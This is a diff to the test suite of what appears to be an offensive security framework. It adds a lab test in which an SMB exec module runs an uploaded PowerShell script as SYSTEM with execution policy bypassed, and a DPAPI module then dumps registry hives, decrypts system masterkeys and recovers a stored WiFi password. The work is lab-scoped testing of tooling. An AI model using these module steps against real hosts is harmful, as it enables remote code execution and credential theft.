@@ -4724,6 +4724,177 @@ class TestDpapiChromeLab(unittest.TestCase):
 
 @unittest.skipUnless(docker_available(), "docker daemon not available")
 @unittest.skipUnless(impacket_available(), "impacket not installed")
+@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
+class TestDpapiSystemLab(unittest.TestCase):
+    """DPAPI stage 5 against the windows lab: the fixture mints a REAL
+    WiFi profile XML whose keyMaterial is a LocalSystem-scope
+    CryptProtectData wrap (smb_exec runs as SYSTEM — real system-scope
+    DPAPI, no synthetic crypto), then dpapi_system pulls the hives via
+    winreg, recovers DPAPI_SYSTEM, decrypts the SYSTEM masterkeys, and
+    reads back the WiFi password."""
+
+    @classmethod
+    def setUpClass(cls):
+        from impacket.smbconnection import SMBConnection
+
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("windows")
+        deadline = time.time() + 300
+        while time.time() < deadline:
+            try:
+                conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=10)
+                conn.login("labadmin", "Labpass2024!")
+                conn.close()
+                break
+            except Exception:
+                time.sleep(5)
+        else:
+            cls.manager.down("windows")
+            raise RuntimeError("windows lab guest SMB not up within 300s")
+        cls._ensure_fixture()
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("windows")
+
+    @classmethod
+    def _fixture_present(cls):
+        from impacket.smbconnection import SMBConnection
+        try:
+            conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=10)
+            conn.login("labadmin", "Labpass2024!")
+        except Exception:
+            return False
+        try:
+            buf = []
+            conn.getFile(
+                "C$", r"ProgramData\Microsoft\Wlansvc\Profiles\Interfaces"
+                r"\{aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee}\ForgeLab.xml",
+                buf.append)
+            data = b"".join(buf)
+            # the keyMaterial must carry a real blob — an empty element
+            # means the wrap failed at fixture time (learned live)
+            return b"<keyMaterial></keyMaterial>" not in data and \
+                b"<keyMaterial>" in data
+        except Exception:
+            return False
+        finally:
+            conn.close()
+
+    @classmethod
+    def _ensure_fixture(cls):
+        if cls._fixture_present():
+            return
+        from impacket.smbconnection import SMBConnection
+        # a service IS SYSTEM, so CurrentUser wraps with the SYSTEM
+        # account's masterkeys — the system-scope files this module
+        # recovers. try/catch + a log: a silent Protect failure once
+        # produced an empty keyMaterial and a useless fixture
+        wifi_ps1 = (
+            "try {\r\n"
+            "  Add-Type -AssemblyName System.Security\r\n"
+            "  $b = [Text.Encoding]::UTF8.GetBytes('WiFiPass2024!')\r\n"
+            "  $e = [Security.Cryptography.ProtectedData]::Protect("
+            "$b, $null, 'CurrentUser')\r\n"
+            "  \"wrap ok: $($e.Length) bytes\" | Out-File "
+            "C:\\Users\\Public\\wifi.log\r\n"
+            "  $hex = ($e | ForEach-Object { $_.ToString('x2') }) "
+            "-join ''\r\n"
+            "  $dir = 'C:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\"
+            "Interfaces\\{aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee}'\r\n"
+            "  New-Item -ItemType Directory -Force -Path $dir | "
+            "Out-Null\r\n"
+            "  $xml = \"<?xml version='1.0'?>\r\n"
+            "<WLANProfile xmlns='http://www.microsoft.com/networking/"
+            "WLAN/profile/v1'>\r\n"
+            " <name>ForgeLabWiFi</name>\r\n"
+            " <SSIDConfig><SSID><name>ForgeLabWiFi</name></SSID>"
+            "</SSIDConfig>\r\n"
+            " <MSM><security><sharedKey>\r\n"
+            "   <keyType>passPhrase</keyType><protected>true</protected>\r\n"
+            "   <keyMaterial>$hex</keyMaterial>\r\n"
+            " </sharedKey></security></MSM>\r\n"
+            "</WLANProfile>\"\r\n"
+            "  [IO.File]::WriteAllText(\"$dir\\ForgeLab.xml\", $xml)\r\n"
+            "  'ok' | Out-File C:\\Users\\Public\\wifi.done\r\n"
+            "} catch {\r\n"
+            "  $_ | Out-String | Out-File C:\\Users\\Public\\wifi.log\r\n"
+            "}\r\n")
+        conn = SMBConnection(HOST, HOST, sess_port=1445, timeout=15)
+        conn.login("labadmin", "Labpass2024!")
+        data = wifi_ps1.encode()
+        state = {"off": 0}
+
+        def reader(size):
+            chunk = data[state["off"]:state["off"] + size]
+            state["off"] += len(chunk)
+            return chunk
+
+        try:
+            conn.putFile("C$", r"Users\Public\wifi.ps1", reader)
+        finally:
+            conn.close()
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            with contextlib.redirect_stdout(io.StringIO()):
+                for command in (
+                    "use exploits/windows/smb_exec",
+                    f"set RHOSTS {HOST}",
+                    "set RPORT 1445",
+                    "set USERNAME labadmin",
+                    "set PASSWORD Labpass2024!",
+                    "set COMMAND powershell -NoProfile -ExecutionPolicy "
+                    "Bypass -File C:\\\\Users\\\\Public\\\\wifi.ps1",
+                    "run",
+                ):
+                    console.onecmd(command)
+        finally:
+            console.store.close()
+        deadline = time.time() + 90
+        while time.time() < deadline:
+            if cls._fixture_present():
+                return
+            time.sleep(5)
+        raise AssertionError("DPAPI system fixture did not materialize "
+                             "on the windows lab guest")
+
+    def test_wifi_password_recovered(self):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            buf = io.StringIO()
+            with contextlib.redirect_stdout(buf):
+                for command in (
+                    "use auxiliary/attack/dpapi_system",
+                    f"set RHOSTS {HOST}",
+                    "set RPORT 1445",
+                    "set USERNAME labadmin",
+                    "set PASSWORD Labpass2024!",
+                    "run",
+                ):
+                    console.onecmd(command)
+            out = buf.getvalue()
+            self.assertNotIn("Traceback", out)
+            self.assertIn("DPAPI_SYSTEM keys recovered", out)
+            self.assertIn("system masterkey decrypted", out)
+            self.assertIn("WiFi ForgeLabWiFi: WiFiPass2024!", out)
+            loot = console.store.loot("credential")
+            self.assertTrue(any("wifi ForgeLabWiFi" in l["label"]
+                                and l["content"] == "WiFiPass2024!"
+                                for l in loot))
+            creds = console.store.creds()
+            self.assertTrue(any(c["username"] == "ForgeLabWiFi"
+                                and c["password"] == "WiFiPass2024!"
+                                for c in creds))
+        finally:
+            console.store.close()
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
 class TestShadowCredsLab(unittest.TestCase):
     """shadow_creds against the AD lab: the fixture schema carries
     msDS-KeyCredentialLink, so the plant + restore are real. The TGT
